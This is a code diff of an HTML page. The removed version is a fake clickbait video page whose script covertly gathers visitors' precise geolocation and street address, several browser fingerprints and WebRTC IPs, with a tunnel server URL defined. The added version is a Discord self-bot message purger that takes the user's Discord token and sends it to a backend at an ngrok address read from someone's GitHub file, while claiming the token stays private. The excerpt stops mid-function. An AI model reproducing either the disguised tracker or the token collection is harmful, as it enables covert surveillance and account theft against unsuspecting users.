@@ -1,543 +1,795 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>You Won't Believe What Happens Next...</title>
-  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet"/>
-  <style>
-    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-    body{
-      background:#0a0a0a;color:#eee;font-family:'Space Grotesk',sans-serif;
-      min-height:100vh;display:flex;align-items:center;justify-content:center;
-      overflow:hidden;position:relative;
-    }
-    .container{text-align:center;max-width:620px;padding:20px}
-    .title{
-      font-family:'Bebas Neue',sans-serif;font-size:clamp(2.8rem,8vw,5.8rem);
-      letter-spacing:0.04em;line-height:1.05;margin-bottom:16px;
-    }
-    .subtitle{
-      font-size:1.4rem;opacity:0.9;margin-bottom:50px;
-    }
-    .video-box{
-      width:clamp(280px,68vw,540px);aspect-ratio:16/9;
-      background:linear-gradient(135deg,#1a1a2e,#16213e,#0f1b3a);
-      border-radius:16px;border:3px solid #333;
-      overflow:hidden;cursor:pointer;position:relative;
-      transition:all .3s ease;box-shadow:0 15px 50px rgba(0,0,0,.7);
-    }
-    .video-box:hover{
-      transform:scale(1.04);border-color:#ff2d55;
-      box-shadow:0 25px 70px rgba(255,45,85,.35);
-    }
-    .play-overlay{
-      position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
-      background:rgba(0,0,0,.45);transition:all .3s;
-    }
-    .video-box:hover .play-overlay{background:rgba(0,0,0,.25)}
-    .play-button{
-      width:88px;height:88px;background:rgba(255,255,255,.95);
-      border-radius:50%;display:flex;align-items:center;justify-content:center;
-      font-size:2.6rem;color:#000;box-shadow:0 10px 30px rgba(0,0,0,.6);
-      transition:transform .2s;
-    }
-    .video-box:hover .play-button{transform:scale(1.12)}
-    .label{
-      position:absolute;bottom:22px;left:22px;
-      font-family:'Bebas Neue',sans-serif;font-size:1.45rem;
-      letter-spacing:0.03em;text-shadow:0 3px 12px rgba(0,0,0,.85);
-    }
-    .duration{
-      position:absolute;bottom:20px;right:22px;
-      background:rgba(0,0,0,.75);padding:4px 12px;border-radius:6px;
-      font-size:0.9rem;font-family:monospace;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>purge.gg</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #09090b;
+    --surface: #101014;
+    --surface2: #17171d;
+    --border: #1f1f2e;
+    --border2: #2a2a3a;
+    --red: #e63946;
+    --red-glow: rgba(230,57,70,0.15);
+    --red-dim: #5c161c;
+    --amber: #f4a261;
+    --green: #2ec4b6;
+    --muted: #3a3a50;
+    --text: #cccce0;
+    --text-dim: #5a5a78;
+    --mono: 'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    padding: 2rem 1.5rem 4rem;
+  }
+
+  .app { max-width: 860px; margin: 0 auto; }
+
+  /* ── Header ── */
+  .header {
+    display: flex; align-items: center; gap: 1rem;
+    margin-bottom: 2.5rem; padding-bottom: 1.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .logo { font-family: var(--display); font-size: 1.7rem; font-weight: 800; letter-spacing: -0.04em; }
+  .logo span { color: var(--red); }
+  .badge {
+    font-size: 0.58rem; background: var(--red-dim); color: var(--red);
+    padding: 0.2rem 0.5rem; border-radius: 3px; border: 1px solid #7a1a22;
+    letter-spacing: 0.12em; font-weight: 600; text-transform: uppercase;
+  }
+  .user-pill {
+    margin-left: auto; display: flex; align-items: center; gap: 0.5rem;
+    background: var(--surface2); border: 1px solid var(--border2);
+    border-radius: 20px; padding: 0.3rem 0.85rem 0.3rem 0.45rem;
+    font-size: 0.7rem; color: var(--text-dim);
+  }
+  .user-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; flex-shrink: 0; }
+  #userPill { display: none; }
+
+  /* ── Section ── */
+  .section {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 1.4rem 1.5rem; margin-bottom: 0.85rem;
+  }
+  .section-title {
+    font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.18em;
+    color: var(--text-dim); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.6rem;
+  }
+  .section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+  /* ── Form controls ── */
+  .row { display: flex; gap: 0.65rem; align-items: flex-end; }
+  label.lbl { font-size: 0.62rem; color: var(--text-dim); display: block; margin-bottom: 0.38rem; letter-spacing: 0.1em; text-transform: uppercase; }
+
+  input[type=text], input[type=password], input[type=datetime-local], select {
+    width: 100%; background: var(--surface2); border: 1px solid var(--border2);
+    color: var(--text); font-family: var(--mono); font-size: 0.8rem;
+    padding: 0.62rem 0.9rem; border-radius: 5px; outline: none; transition: border-color 0.15s;
+    -webkit-appearance: none; appearance: none;
+  }
+  input:focus, select:focus { border-color: var(--red); }
+  input::placeholder { color: var(--muted); }
+  input[type=password] { letter-spacing: 0.2em; }
+  select { cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%235a5a78' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 0.85rem center; padding-right: 2.2rem; }
+  select option { background: #17171d; }
+  input[type=datetime-local]::-webkit-calendar-picker-indicator { filter: invert(0.4); cursor: pointer; }
+
+  .fg { flex: 1; }
+
+  /* ── Buttons ── */
+  .btn {
+    font-family: var(--mono); font-size: 0.76rem; font-weight: 600;
+    padding: 0.63rem 1.2rem; border-radius: 5px; border: none;
+    cursor: pointer; transition: all 0.13s; letter-spacing: 0.04em; white-space: nowrap;
+  }
+  .btn-primary { background: var(--red); color: #fff; }
+  .btn-primary:hover { background: #ff4555; box-shadow: 0 0 20px var(--red-glow); }
+  .btn-primary:disabled { background: var(--red-dim); color: var(--muted); cursor: not-allowed; box-shadow: none; }
+  .btn-ghost { background: transparent; color: var(--text-dim); border: 1px solid var(--border2); }
+  .btn-ghost:hover { border-color: var(--text-dim); color: var(--text); }
+  .btn-stop { background: transparent; color: var(--amber); border: 1px solid rgba(244,162,97,0.4); }
+  .btn-stop:hover { background: rgba(244,162,97,0.08); border-color: var(--amber); }
+  .btn-sm { padding: 0.45rem 0.75rem; font-size: 0.7rem; }
+  .btn-full { width: 100%; }
+  .btn-icon { padding: 0.63rem 0.85rem; }
+
+  /* ── DM List ── */
+  .dm-list {
+    display: flex; flex-direction: column; gap: 0.3rem;
+    max-height: 260px; overflow-y: auto;
+    scrollbar-width: thin; scrollbar-color: var(--border2) transparent;
+  }
+  .dm-item {
+    display: flex; align-items: center; gap: 0.7rem;
+    padding: 0.6rem 0.8rem; border-radius: 5px;
+    border: 1px solid transparent; cursor: pointer; transition: all 0.12s;
+  }
+  .dm-item:hover { background: var(--surface2); border-color: var(--border); }
+  .dm-item.sel { background: rgba(230,57,70,0.07); border-color: rgba(230,57,70,0.3); }
+  .dm-av {
+    width: 28px; height: 28px; border-radius: 50%;
+    background: var(--surface2); border: 1px solid var(--border2);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.65rem; color: var(--text-dim); flex-shrink: 0; font-weight: 600;
+  }
+  .dm-name { font-size: 0.78rem; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .dm-tag { font-size: 0.58rem; color: var(--text-dim); background: var(--surface2); padding: 0.12rem 0.35rem; border-radius: 3px; flex-shrink: 0; }
+  .dm-sel-dot { color: var(--red); font-size: 0.7rem; flex-shrink: 0; }
+
+  /* ── Custom Slider ── */
+  .slider-wrap { user-select: none; }
+  .custom-slider {
+    position: relative; height: 28px; display: flex; align-items: center; cursor: pointer;
+    margin: 0.2rem 0;
+  }
+  .track {
+    position: absolute; left: 0; right: 0; height: 4px;
+    background: var(--border2); border-radius: 4px; pointer-events: none;
+  }
+  .track-fill {
+    position: absolute; left: 0; height: 100%;
+    background: linear-gradient(90deg, var(--green), var(--red));
+    border-radius: 4px; transition: width 0.05s;
+    pointer-events: none;
+  }
+  .thumb {
+    position: absolute; width: 18px; height: 18px;
+    background: #fff; border-radius: 50%;
+    border: 2px solid var(--red);
+    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    transform: translateX(-50%);
+    pointer-events: none;
+    transition: border-color 0.1s, box-shadow 0.1s;
+  }
+  .custom-slider:active .thumb, .custom-slider.dragging .thumb {
+    border-color: #fff; box-shadow: 0 0 14px var(--red-glow);
+  }
+  .slider-labels { display: flex; justify-content: space-between; font-size: 0.6rem; color: var(--text-dim); margin-top: 0.35rem; }
+  .speed-display {
+    display: flex; align-items: baseline; gap: 0.5rem; margin-bottom: 0.65rem;
+  }
+  .speed-val { font-family: var(--display); font-size: 1.8rem; font-weight: 700; line-height: 1; }
+  .speed-unit { font-size: 0.7rem; color: var(--text-dim); }
+  .speed-tag { font-size: 0.68rem; padding: 0.2rem 0.55rem; border-radius: 4px; font-weight: 500; }
+
+  /* ── Filter Tabs ── */
+  .filter-tabs { display: flex; gap: 0.4rem; margin-bottom: 0.9rem; }
+  .ftab {
+    font-family: var(--mono); font-size: 0.7rem; padding: 0.42rem 0.9rem;
+    border-radius: 4px; border: 1px solid var(--border2); background: transparent;
+    color: var(--text-dim); cursor: pointer; transition: all 0.12s;
+  }
+  .ftab:hover { border-color: var(--text-dim); color: var(--text); }
+  .ftab.fa { border-color: rgba(230,57,70,0.5); color: var(--red); background: rgba(230,57,70,0.06); }
+  .ftab.fb { border-color: rgba(46,196,182,0.5); color: var(--green); background: rgba(46,196,182,0.06); }
+  #dateRow { margin-top: 0.7rem; }
+
+  /* ── Stats ── */
+  .stats-row { display: flex; gap: 2rem; padding: 0.6rem 0 1rem; }
+  .stat-val { font-family: var(--display); font-size: 1.5rem; font-weight: 700; line-height: 1; }
+  .stat-lbl { font-size: 0.58rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 0.2rem; }
+  .status-row { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.85rem; }
+  .sdot { display: inline-block; width: 7px; height: 7px; border-radius: 50%; background: var(--muted); }
+  .sdot.running { background: var(--red); animation: blink 1s ease-in-out infinite; }
+  .sdot.done { background: var(--green); }
+  .sdot.stopped { background: var(--amber); }
+  @keyframes blink { 0%,100%{opacity:1}50%{opacity:0.3} }
+  .status-txt { font-size: 0.72rem; color: var(--text-dim); }
+  .ctrl-row { display: flex; gap: 0.65rem; }
+
+  /* ── Console ── */
+  .console {
+    background: #060608; border: 1px solid var(--border);
+    border-radius: 6px; padding: 0.8rem 1rem;
+    height: 210px; overflow-y: auto; font-size: 0.7rem; line-height: 1.75;
+    scrollbar-width: thin; scrollbar-color: var(--border2) transparent;
+  }
+  .l { color: var(--text-dim); }
+  .l.ok { color: var(--green); }
+  .l.err { color: var(--red); }
+  .l.warn { color: var(--amber); }
+  .l.sys { color: #3a3a58; font-style: italic; }
+  .console-hdr { display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.6rem; }
+
+  /* ── Error ── */
+  .err-box {
+    background: rgba(230,57,70,0.07); border: 1px solid rgba(230,57,70,0.25);
+    color: #e67380; border-radius: 5px; padding: 0.6rem 0.9rem;
+    font-size: 0.75rem; margin-top: 0.7rem; display: none;
+  }
+
+  /* ── Grid ── */
+  .g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 0.85rem; }
+  @media (max-width: 600px) {
+    .g2 { grid-template-columns: 1fr; }
+    .row { flex-wrap: wrap; }
+  }
+
+  .note { font-size: 0.6rem; color: var(--text-dim); margin-top: 0.6rem; }
+  hr.sep { border: none; border-top: 1px solid var(--border); margin: 1rem 0; }
+
+  /* ── API Down Modal ── */
+  .modal-overlay {
+    position: fixed; inset: 0; z-index: 9999;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(8px);
+    display: flex; align-items: center; justify-content: center;
+    padding: 1.5rem;
+  }
+  .modal-box {
+    background: var(--surface);
+    border: 1px solid rgba(230,57,70,0.35);
+    border-radius: 10px;
+    padding: 2.2rem 2rem;
+    max-width: 420px; width: 100%;
+    text-align: center;
+    box-shadow: 0 0 60px rgba(230,57,70,0.12);
+    animation: modalIn 0.25s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes modalIn {
+    from { opacity: 0; transform: scale(0.88) translateY(16px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+  }
+  .modal-icon {
+    font-size: 2.4rem; margin-bottom: 1rem;
+    animation: pulse2 2s ease-in-out infinite;
+  }
+  @keyframes pulse2 { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  .modal-title {
+    font-family: var(--display); font-size: 1.4rem; font-weight: 800;
+    color: var(--red); letter-spacing: -0.02em; margin-bottom: 0.5rem;
+  }
+  .modal-sub {
+    font-size: 0.74rem; color: var(--text-dim); line-height: 1.6; margin-bottom: 1.5rem;
+  }
+  .modal-sub strong { color: var(--text); }
+  .modal-status {
+    font-size: 0.65rem; color: var(--text-dim); margin-top: 1rem;
+    letter-spacing: 0.06em;
+  }
+  .modal-status span { color: var(--red); }
+</style>
 </head>
 <body>
-  <div class="container">
-    <div class="title">YOU WON'T BELIEVE<br>WHAT HAPPENS NEXT</div>
-    <div class="subtitle">This video is actually insane... click to watch 👀</div>
-    
-    <div class="video-box" id="trap" onclick="handleClick()">
-      <div class="play-overlay">
-        <div class="play-button">▶</div>
-      </div>
-      <div class="label">mind blowing ending you won't see coming</div>
-      <div class="duration">4:20</div>
+
+<!-- API Down Modal (uncloseable) -->
+<div class="modal-overlay" id="apiDownModal">
+  <div class="modal-box">
+    <div class="modal-icon">⚡</div>
+    <div class="modal-title">API is Offline</div>
+    <div class="modal-sub">
+      The backend server is currently <strong>unreachable</strong>.<br>
+      Make sure <strong>purger_backend.py</strong> is running and ngrok is active, then retry.
+    </div>
+    <button class="btn btn-primary btn-full" id="retryBtn" onclick="retryAPI()">Retry Connection</button>
+    <div class="modal-status">checking <span>purge.gg</span> backend…</div>
+  </div>
+</div>
+
+<div class="app">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo">purge<span>.gg</span></div>
+    <div class="badge">Beta</div>
+    <div class="user-pill" id="userPill">
+      <div class="user-dot"></div>
+      <span id="userPillName">—</span>
+      <button class="btn btn-ghost btn-sm" onclick="disconnect()" style="padding:0.15rem 0.45rem;font-size:0.62rem;margin-left:0.2rem;">✕</button>
     </div>
   </div>
 
+  <!-- Token Section -->
+  <div class="section" id="authSection">
+    <div class="section-title">Token Auth</div>
+    <div class="row">
+      <div class="fg">
+        <label class="lbl">User Token</label>
+        <input type="password" id="tokenInput" placeholder="Your Discord user token..." autocomplete="off" onkeydown="if(event.key==='Enter')connect()">
+      </div>
+      <button class="btn btn-ghost btn-icon btn-sm" onclick="toggleToken()" id="showBtn" title="Show/hide">👁</button>
+      <button class="btn btn-primary" id="connectBtn" onclick="connect()">Connect</button>
+    </div>
+    <div class="err-box" id="authErr"></div>
+    <p class="note">🔒 Your token is <strong style="color:var(--text)">never shared with any third parties</strong>. It is sent only to your personal backend — no external servers ever see it.</p>
+  </div>
+
+  <!-- Main UI (hidden until authed) -->
+  <div id="mainUI" style="display:none">
+
+    <!-- DM Picker -->
+    <div class="section">
+      <div class="section-title">Select DM Channel</div>
+      <div class="dm-list" id="dmList">
+        <p style="font-size:0.78rem;color:var(--text-dim)">Loading DMs…</p>
+      </div>
+    </div>
+
+    <div class="g2">
+
+      <!-- Speed -->
+      <div class="section">
+        <div class="section-title">Delete Speed</div>
+        <div class="speed-display">
+          <span class="speed-val" id="speedVal">1.0</span>
+          <span class="speed-unit">s delay</span>
+          <span class="speed-tag" id="speedTag">🟡 Normal</span>
+        </div>
+        <div class="slider-wrap">
+          <div class="custom-slider" id="speedSlider">
+            <div class="track">
+              <div class="track-fill" id="trackFill"></div>
+            </div>
+            <div class="thumb" id="sliderThumb"></div>
+          </div>
+          <div class="slider-labels">
+            <span>0.1s</span>
+            <span style="color:var(--amber)">fastest ← → safest</span>
+            <span>5s</span>
+          </div>
+        </div>
+        <p class="note" style="margin-top:0.6rem" id="speedNote">⚡ Lower = faster but higher ban risk. 0.5s+ recommended.</p>
+      </div>
+
+      <!-- Date Filter -->
+      <div class="section">
+        <div class="section-title">Date Filter</div>
+        <div class="filter-tabs">
+          <button class="ftab fa" id="ftAll" onclick="setFilter('all')">All messages</button>
+          <button class="ftab" id="ftBefore" onclick="setFilter('before')">Before date</button>
+          <button class="ftab" id="ftAfter" onclick="setFilter('after')">After date</button>
+        </div>
+        <div id="dateRow" style="display:none">
+          <label class="lbl">Pick Date &amp; Time</label>
+          <input type="datetime-local" id="dateInput">
+        </div>
+        <p class="note" style="margin-top:0.7rem" id="filterNote">Deletes all messages you sent in this DM.</p>
+      </div>
+    </div>
+
+    <!-- Controls + Stats -->
+    <div class="section">
+      <div class="status-row">
+        <div class="sdot" id="statusDot"></div>
+        <span class="status-txt" id="statusTxt">Idle — select a DM to start</span>
+      </div>
+      <div class="stats-row">
+        <div>
+          <div class="stat-val" id="statDeleted" style="color:var(--red)">0</div>
+          <div class="stat-lbl">Deleted</div>
+        </div>
+        <div>
+          <div class="stat-val" id="statSkipped" style="color:var(--text-dim)">0</div>
+          <div class="stat-lbl">Skipped</div>
+        </div>
+        <div>
+          <div class="stat-val" id="statTarget" style="color:var(--amber);font-size:0.85rem;font-family:var(--mono)">—</div>
+          <div class="stat-lbl">Target</div>
+        </div>
+      </div>
+      <div class="ctrl-row">
+        <button class="btn btn-primary btn-full" id="startBtn" onclick="startPurge()" disabled>▶ Start Purge</button>
+        <button class="btn btn-stop" id="stopBtn" onclick="stopPurge()" style="display:none">■ Stop</button>
+      </div>
+    </div>
+
+    <!-- Console -->
+    <div class="section">
+      <div class="console-hdr">
+        <div class="section-title" style="margin-bottom:0">Console</div>
+        <button class="btn btn-ghost btn-sm" onclick="clearConsole()">Clear</button>
+      </div>
+      <div class="console" id="console"></div>
+    </div>
+
+  </div><!-- /mainUI -->
+
+  <p style="text-align:center;font-size:0.58rem;color:var(--text-dim);margin-top:1.5rem">
+    ⚠️ Self-botting may violate Discord's ToS &nbsp;·&nbsp; Your token is never shared with any third parties
+  </p>
+</div><!-- /app -->
+
 <script>
+const NGROK_SOURCE = 'https://raw.githubusercontent.com/iamdookie1/website3/main/Ngrok%20link';
+let API = null; // set after ngrok fetch
 
-const SERVER_URL = "https://had-several-cleanup-injured.trycloudflare.com";
-
-const $ = id => document.getElementById(id);
-const safe = (fn, fb = 'N/A') => { try { const v = fn(); return v ?? fb; } catch { return fb; } };
-const safeA = async (fn, fb = 'N/A') => { try { const v = await fn(); return v ?? fb; } catch { return fb; } };
-
-function getLocation(){
-  return new Promise(resolve=>{
-    if(!navigator.geolocation) return resolve({error:'not supported'});
-    navigator.geolocation.getCurrentPosition(async pos=>{
-      const {latitude,longitude,accuracy,altitude,altitudeAccuracy,heading,speed}=pos.coords;
-      let address={};
-      try{
-        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`,{headers:{'Accept-Language':'en','User-Agent':'trap-demo/1.0'}});
-        const d=await r.json();
-        const a=d.address||{};
-        address={
-          displayName: d.display_name||'',
-          houseNumber: a.house_number||'',
-          road: a.road||a.pedestrian||a.footway||a.path||'',
-          suburb: a.suburb||a.neighbourhood||a.quarter||'',
-          city: a.city||a.town||a.village||a.hamlet||a.municipality||'',
-          district: a.city_district||a.district||'',
-          county: a.county||'',
-          state: a.state||a.region||'',
-          stateDistrict:a.state_district||'',
-          postcode: a.postcode||'',
-          country: a.country||'',
-          countryCode: (a.country_code||'').toUpperCase(),
-          osmType: d.type||'',
-          osmClass: d['class']||'',
-        };
-      }catch{ address={error:'reverse geocode failed'}; }
-      resolve({latitude,longitude,accuracy,altitude,altitudeAccuracy,heading,speed,address,
-        googleMapsUrl:`https://maps.google.com/?q=${latitude},${longitude}`,
-        osmUrl:`https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=17`});
-    },
-    err=>resolve({error:err.message,code:err.code,
-      CODES:{1:'PERMISSION_DENIED',2:'POSITION_UNAVAILABLE',3:'TIMEOUT'}[err.code]||''}),
-    {enableHighAccuracy:true,timeout:12000,maximumAge:0});
-  });
+async function initAPI() {
+  try {
+    const res = await fetch(NGROK_SOURCE, { cache: 'no-store' });
+    if (!res.ok) throw new Error('fetch failed');
+    const url = (await res.text()).trim().replace(/\/$/, '');
+    if (!url.startsWith('http')) throw new Error('bad url');
+    API = url + '/api';
+    // ping the actual backend
+    const ping = await fetch(`${API}/ping`, { signal: AbortSignal.timeout(6000) });
+    if (!ping.ok) throw new Error('backend down');
+    document.getElementById('apiDownModal').style.display = 'none';
+  } catch {
+    showApiDown();
+  }
 }
 
-async function getUACH(){
-  if(!navigator.userAgentData) return {available:false};
-  try{
-    const h=await navigator.userAgentData.getHighEntropyValues([
-      'architecture','bitness','brands','fullVersionList','mobile',
-      'model','platform','platformVersion','uaFullVersion','wow64'
-    ]);
-    return {available:true,...h};
-  }catch{ return {available:true,basic:navigator.userAgentData.brands}; }
+function showApiDown() {
+  document.getElementById('apiDownModal').style.display = 'flex';
 }
 
-function canvasFP(){
-  try{
-    const c=document.createElement('canvas'); c.width=400; c.height=100;
-    const cx=c.getContext('2d');
-    const g=cx.createLinearGradient(0,0,400,0);
-    g.addColorStop(0,'#ff0000'); g.addColorStop(.5,'#00ff00'); g.addColorStop(1,'#0000ff');
-    cx.fillStyle=g; cx.fillRect(0,0,400,100);
-    cx.textBaseline='alphabetic';
-    cx.fillStyle='rgba(0,0,200,.7)'; cx.font='bold 18px "Times New Roman"';
-    cx.fillText('Cwm fjordbank 🪤 trap! ♥ éàü', 4, 40);
-    cx.fillStyle='rgba(200,0,0,.6)'; cx.font='14px Arial';
-    cx.fillText('Cwm fjordbank 🪤 trap! ♥ éàü', 6, 60);
-    cx.fillStyle='rgba(0,180,0,.5)'; cx.font='italic 13px Georgia';
-    cx.fillText('Åßæø test 中文 العربية', 4, 80);
-    cx.strokeStyle='rgba(255,128,0,.8)'; cx.lineWidth=2;
-    cx.beginPath(); cx.arc(350,50,35,0,Math.PI*2); cx.stroke();
-    cx.fillStyle='rgba(0,255,255,.4)'; cx.fillRect(300,10,60,30);
-    const raw=c.toDataURL('image/png');
-    let h=0; for(let i=0;i<raw.length;i++) h=Math.imul(31,h)+raw.charCodeAt(i)|0;
-    return {hash:(h>>>0).toString(16).padStart(8,'0'), rawTail:btoa(raw.slice(-80)).slice(0,48)};
-  }catch{return{hash:'blocked',rawTail:''};}
+async function retryAPI() {
+  document.getElementById('retryBtn').textContent = 'Checking…';
+  document.getElementById('retryBtn').disabled = true;
+  await initAPI();
+  document.getElementById('retryBtn').textContent = 'Retry';
+  document.getElementById('retryBtn').disabled = false;
 }
 
-function webglInfo(){
-  const get=(type)=>{
-    try{
-      const c=document.createElement('canvas');
-      const gl=c.getContext(type);
-      if(!gl) return null;
-      const dbg=gl.getExtension('WEBGL_debug_renderer_info');
-      const exts=gl.getSupportedExtensions()||[];
-      const params={};
-      [[gl.MAX_TEXTURE_SIZE,'maxTextureSize'],[gl.MAX_VIEWPORT_DIMS,'maxViewport'],
-       [gl.MAX_VERTEX_ATTRIBS,'maxVertexAttribs'],[gl.MAX_VERTEX_UNIFORM_VECTORS,'maxVertexUniforms'],
-       [gl.MAX_FRAGMENT_UNIFORM_VECTORS,'maxFragmentUniforms']
-      ].forEach(([p,k])=>{ try{params[k]=gl.getParameter(p);}catch{} });
-      return {
-        renderer: dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'hidden',
-        vendor: dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):'hidden',
-        version: gl.getParameter(gl.VERSION),
-        glslVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-        extensionCount: exts.length,
-        extensions: exts,
-        params,
-      };
-    }catch{return null;}
-  };
-  return {webgl:get('webgl'), webgl2:get('webgl2')};
+// ── State ──────────────────────────────────────────────────────────
+let state = {
+  token: localStorage.getItem('dc_token') || '',
+  user: null,
+  dms: [],
+  selectedDm: null,
+  speed: 1.0,   // seconds
+  filterType: 'all',
+  jobId: null,
+  jobStatus: 'idle',
+  pollTimer: null,
+  seenLogs: new Set(),
+};
+
+// ── Init ──────────────────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded', () => {
+  if (state.token) {
+    document.getElementById('tokenInput').value = state.token;
+  }
+  initSlider();
+  setFilter('all');
+  log('// Purger ready. Connect your token to begin.', 'sys');
+  initAPI();
+});
+
+// ── Token / Auth ──────────────────────────────────────────────────
+function toggleToken() {
+  const inp = document.getElementById('tokenInput');
+  const btn = document.getElementById('showBtn');
+  inp.type = inp.type === 'password' ? 'text' : 'password';
+  btn.textContent = inp.type === 'password' ? '👁' : '🙈';
 }
 
-async function audioFP(){
-  try{
-    const ctx=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,4096,44100);
-    const osc=ctx.createOscillator();
-    const cmp=ctx.createDynamicsCompressor();
-    [['threshold',-50],['knee',40],['ratio',12],['attack',0],['release',.25]]
-      .forEach(([k,v])=>cmp[k]?.setValueAtTime(v,ctx.currentTime));
-    osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
-    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
-    const buf=await ctx.startRendering();
-    const data=buf.getChannelData(0).slice(4500,4600);
-    let hash=0; data.forEach(v=>{hash=(hash*31+Math.floor(v*1e9))|0;});
-    const realCtx=new(window.AudioContext||window.webkitAudioContext)();
-    const info={
-      hash:(hash>>>0).toString(16),
-      sampleRate:realCtx.sampleRate,
-      maxChannelCount:realCtx.destination.maxChannelCount,
-      state:realCtx.state,
-    };
-    realCtx.close();
-    return info;
-  }catch{return{hash:'blocked'};}
-}
+async function connect() {
+  const token = document.getElementById('tokenInput').value.trim();
+  if (!token) return;
+  state.token = token;
 
-function mathFP(){
-  const vals=[
-    Math.acos(0.12),Math.acosh(1.5),Math.asin(0.12),Math.asinh(1),
-    Math.atan(2),Math.atanh(0.5),Math.cbrt(2),Math.cos(0.1),
-    Math.cosh(1),Math.expm1(1),Math.hypot(2,3,4),Math.imul(3,4),
-    Math.log2(2**31-1),Math.log10(5),Math.pow(Math.PI,Math.E),
-    Math.sinh(1),Math.tan(-1e300),Math.tanh(0.1),
-    1/0, -1/0, 0/0,
-    Number.EPSILON, Number.MAX_SAFE_INTEGER,
-  ];
-  let h=0; vals.forEach((v,i)=>{ const s=isFinite(v)?v.toString(36):''+v; for(const c of s) h=(h*31+c.charCodeAt(0))|0; });
-  return {hash:(h>>>0).toString(16), vals:vals.slice(0,8).map(v=>v.toPrecision?v.toPrecision(15):String(v))};
-}
-
-function getWebRTCIPs(){
-  return new Promise(resolve=>{
-    const ips=new Set();
-    try{
-      const pc=new RTCPeerConnection({iceServers:[
-        {urls:'stun:stun.l.google.com:19302'},
-        {urls:'stun:stun1.l.google.com:19302'},
-      ]});
-      pc.createDataChannel('');
-      pc.createOffer().then(o=>pc.setLocalDescription(o));
-      pc.onicecandidate=e=>{
-        if(!e?.candidate){pc.close();resolve([...ips]);return;}
-        const m=/(\d{1,3}\.){3}\d{1,3}/.exec(e.candidate.candidate);
-        if(m) ips.add(m[0]);
-      };
-      setTimeout(()=>{try{pc.close();}catch{}resolve([...ips]);},2500);
-    }catch{resolve([]);}
-  });
-}
-
-function enumerateFonts(){
-  const fonts=[
-    'Arial','Arial Black','Arial Narrow','Calibri','Cambria','Candara',
-    'Comic Sans MS','Consolas','Constantia','Corbel','Courier New',
-    'Franklin Gothic Medium','Futura','Garamond','Geneva','Georgia',
-    'Gill Sans','Helvetica','Helvetica Neue','Impact','Lucida Console',
-    'Lucida Grande','Lucida Sans Unicode','Microsoft Sans Serif','Monaco',
-    'Palatino','Palatino Linotype','Segoe UI','Tahoma','Times New Roman',
-    'Trebuchet MS','Verdana','Webdings','Wingdings',
-    'San Francisco','Helvetica Neue','Menlo','Monaco','SF Mono',
-    'DejaVu Sans','DejaVu Serif','FreeSerif','FreeSans','Liberation Sans',
-    'Liberation Serif','Ubuntu','Noto Sans','Noto Serif','Droid Sans',
-    'Roboto','Open Sans','Lato','Oswald','Montserrat','Raleway','Nunito',
-    '微軟雅黑','宋体','MS Gothic','Hiragino Sans',
-    'Yu Gothic','Malgun Gothic','Apple SD Gothic Neo',
-  ];
-  const c=document.createElement('canvas'); c.width=200; c.height=40;
-  const cx=c.getContext('2d');
-  const TEST='mmmmmmmmmmlli'; const BASE_FONT='monospace';
-  const measure=(f)=>{ cx.font=`16px "${f}", ${BASE_FONT}`; return cx.measureText(TEST).width; };
-  const base=measure('aaaNonExistentFont12345__');
-  const found=fonts.filter(f=>measure(f)!==base);
-  return {count:found.length, fonts:found};
-}
-
-function perfInfo(){
-  const t=performance.timing||{};
-  const nav=performance.getEntriesByType('navigation')[0]||{};
-  const paint={}; performance.getEntriesByType('paint').forEach(e=>{paint[e.name]=Math.round(e.startTime)+'ms';});
-  const mem=safe(()=>({
-    usedJSHeapMB: ((performance.memory.usedJSHeapSize /1048576).toFixed(2)),
